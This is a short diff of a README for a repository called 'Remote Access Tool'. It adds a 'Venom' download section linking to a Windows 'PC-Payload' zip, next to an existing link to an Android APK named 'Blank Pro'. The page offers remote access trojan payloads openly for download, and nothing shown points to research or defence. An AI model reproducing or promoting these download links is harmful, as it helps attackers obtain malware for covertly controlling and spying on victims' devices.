@@ -6,3 +6,5 @@ Remote Access Tool
 
 1. <a href="https://github.com/ShTasrif/RAT/blob/main/Blank-Pro.apk?raw=true" class="btn">Blank Pro</a>
 
+## Download Link (Venom)
+1. <a href="https://github.com/ShTasrif/RAT/raw/main/PC-Payload/windows.zip" class="btn">Windows</a>
